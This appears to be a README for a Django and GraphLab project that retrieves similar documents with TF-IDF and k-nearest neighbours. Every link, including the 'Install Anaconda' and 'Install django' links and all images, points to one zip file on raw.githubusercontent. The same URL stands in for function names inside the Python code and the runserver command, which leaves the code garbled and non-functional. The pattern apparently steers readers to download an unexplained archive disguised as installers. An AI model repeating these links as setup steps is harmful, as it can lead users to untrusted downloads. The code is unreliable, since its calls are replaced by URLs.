# Analogous-Document-Retrieval

### Similar Articles can be retrieved using ML Techniques, Such as word-count, TF - IDF, k'NN model. Brute force nearest neighbors model training, Pairwise querying.

[Project Reference](https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip)

## Installations

[Install Anaconda Navigator & GraphLab Create](https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip)

[Install django](https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip)

**django files structure**

![django files structure](https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip%20files%20path%https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip)

**Code Logic (https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip)**
```
import graphlab
https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip('GRAPHLAB_DEFAULT_NUM_PYLAMBDA_WORKERS', 4)
people = https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip('https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip')
people['word_count'] = https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip(people['text'])
tfidf = https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip(people['word_count'])

if https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip <= '1.6.1':
   tfidf = tfidf['docs']

people['tfidf'] = tfidf
knn_model = https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip(people,features=['tfidf'],label='name')

pname = people[people['name'] == sname]
https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip(pname)
```

### In Anaconda Navigator > Environments > (gl-env) Open Terminal
![Anaconda Terminal](https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip%https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip)

### Run django Server 
```
python https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip runserver
```
![django server](https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip%https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip)

### Sending Input
![Input](https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip)

## Output
![output1](https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip%https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip)
![output2](https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Analogous-Document-Retrieval.zip)
